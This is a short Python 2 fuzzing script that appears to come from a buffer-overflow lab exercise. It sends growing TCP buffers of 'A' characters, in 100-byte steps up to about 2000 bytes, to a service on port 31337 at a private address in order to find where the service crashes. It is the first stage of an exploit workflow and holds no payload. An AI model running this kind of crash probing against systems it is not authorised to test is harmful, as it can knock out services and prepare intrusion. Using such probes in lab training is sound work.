#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Autor: 1º Ten Chitolina - 0x4rt3mis

import socket
import time
import sys

size = 100
while(size < 2000):
    try:
        print "\nSending buffer size of %s bytes" % size
        buffer = "A" * size + "\n"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect(("192.168.122.49", 31337))
        s.send(buffer)
        
        s.close()

        size +=100
        time.sleep(3)
    except:
        print "\nCould not connect!"
        sys.exit()
